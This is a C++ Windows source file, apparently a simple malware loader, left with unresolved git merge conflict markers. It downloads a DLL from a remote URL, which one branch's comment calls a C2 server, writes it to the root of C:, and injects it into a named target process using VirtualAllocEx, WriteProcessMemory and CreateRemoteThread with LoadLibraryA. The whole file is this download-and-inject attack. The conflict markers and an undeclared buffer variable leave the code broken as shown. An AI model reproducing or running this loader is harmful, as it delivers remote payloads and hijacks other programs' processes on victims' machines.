#include <iostream>
#include <Windows.h>
#include <string>
#include "Shlwapi.h"
#include "process_actions.h"
#include "getlast_error.h"
#include <WinInet.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Wininet.lib")
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

<<<<<<< HEAD
//A simple DLL injection example
=======
//A simple remote DLL injection example
>>>>>>> 69452903fd6e904a16002ec73037d800489350fa

void GetPayload() {
	char* fBuffer = NULL;
	DWORD numberOfBytesRead = 0;
	DWORD nnumberBytesWritten = 0;

	//Get a handle to the useragent 
	HINTERNET iOpen = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (iOpen == NULL) {
		std::cerr << "error could not open handle to user agent: " << GetLastErrorAsString();
	}
	else {
<<<<<<< HEAD
		//if using not relative url use InternetCanonicalizeUrl
		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "", 0, 0, INTERNET_FLAG_RELOAD, 0);
		if (iOpen == NULL) {
			std::cerr << "could not access resource: " << GetLastErrorAsString();
		}
		else {
			//create empty file on disk
			HANDLE hOut = CreateFile(L"C:\\testDll.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
=======
		//fetch the payload from the c2 get a handle to the resource. if using not relative url use InternetCanonicalizeUrl
		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "<url_path_to_remote_dll>", 0, 0, INTERNET_FLAG_RELOAD, 0);
		if (iRsrc == NULL) {
			std::cerr << "could not access resource: " << GetLastErrorAsString();
		}
		else {
			//get a handle to the file to be created on disk. the payload will be stored on the root of the C:\ drive. 
			HANDLE hOut = CreateFile(L"C:\\fi.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
			if (hOut == INVALID_HANDLE_VALUE) {
				cerr << "could not create file: " << GetLastErrorAsString() << endl;
			}
			else {
				do {
<<<<<<< HEAD
					fBuffer = new char[2000];
					ZeroMemory(fBuffer, 2000);
					//read the file from the url
					InternetReadFile(iRsrc, (LPVOID)fBuffer, 2000, &numberOfBytesRead);
					if (!(InternetReadFile(iRsrc, (LPVOID)fBuffer, 2000, &numberOfBytesRead))) {
						cerr << "error could not read from the file: " << GetLastErrorAsString();
					}
					else {
						//write to the file 
						if (!(WriteFile(hOut, &fBuffer[0], numberOfBytesRead, &nnumberBytesWritten, NULL))) {
							cerr << "could not write the file" << GetLastErrorAsString();
						}
					}
					//clean up. free memory and close handles
					delete[] fBuffer;
					fBuffer = NULL;
=======
					//read and write the file to a location on disk 
					lpBuffer = new char[2000];
					ZeroMemory(lpBuffer, 2000);
						InternetReadFile(iRsrc, (LPVOID)lpBuffer, 2000, &numberOfBytesRead);
						WriteFile(hOut, &lpBuffer[0], numberOfBytesRead, &nnumberBytesWritten, NULL);
					delete[] lpBuffer;
					lpBuffer = NULL;
>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
				} while (numberOfBytesRead);
				CloseHandle(hOut);
			}
			InternetCloseHandle(iOpen);
			InternetCloseHandle(iRsrc);
		}
	}
	return;
}

int executePayload() {
	WIN32_FIND_DATAA fdata;
<<<<<<< HEAD
	//get a handle to the file created
	HANDLE findFile = FindFirstFileA("C:\\testDll.dll", &fdata);

=======
	
	//validate the payload was sucessfully downloaded
	HANDLE findFile = FindFirstFileA("C:\\fi.dll", &fdata);
>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
	if (findFile == INVALID_HANDLE_VALUE) {
		cerr << "Could not find fild data" << GetLastErrorAsString();
	}
	else {
		std::string pname, dllpath;
		PROCESS_ACTIONS::ProcActions<DWORD> obj;

<<<<<<< HEAD
		const char* p = ""; const char* d = "C:\\testDll.dll";
=======
		//specifiy the name of the app to be targeted and path of the dll.
		const char* p = "<app_name_here>"; const char* d = "C:\\fi.dll";
>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
		if (obj.getProcessIDbyName(p) == 0) {
			cerr << "[ERROR] The process specified was not found." << std::endl;
			
		}
		//Check if the path to the file exists
		if (!PathFileExistsA(d)) {
			cerr << "\n[ERROR] Invalid file path specified." << endl;
		}
		else {
<<<<<<< HEAD
			//open a handle to the target process
=======
			//open a handle to the process specified
>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, obj.getProcessIDbyName(p));
			if (hProcess == NULL) {
				cerr << "Could not open process" << GetLastErrorAsString();
			}
			else {
<<<<<<< HEAD
				//allocate memory in process, save base address
=======

>>>>>>> 69452903fd6e904a16002ec73037d800489350fa
				LPVOID dllP = VirtualAllocEx(hProcess, 0, strlen(d) + 1, MEM_COMMIT, PAGE_READWRITE);
				if (dllP == NULL) {
					cerr << "Failed to allocate memory in process. " << GetLastErrorAsString() << endl;
				}
				else {
					//write the path to the region allocated
					WriteProcessMemory(hProcess, dllP, (LPVOID)d, strlen(d) + 1, 0);
					HANDLE handleLthd = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), dllP, 0, 0);
					DWORD retVal = WaitForSingleObject(handleLthd, INFINITE);
					if (handleLthd == NULL | retVal == WAIT_FAILED) {
						cerr << "Failed to create remote thread in process." << endl;
						return -1;
					}
					printf("Path allocation address:  0x%08x\n", dllP);
					VirtualFreeEx(hProcess, dllP, strlen(d) + 1, MEM_RELEASE);
				}
			}
		}
		CloseHandle(findFile);
	}
	return 0;
}

int main(int argc, char* argv[])
{
	GetPayload();
	executePayload();
	return 0;
}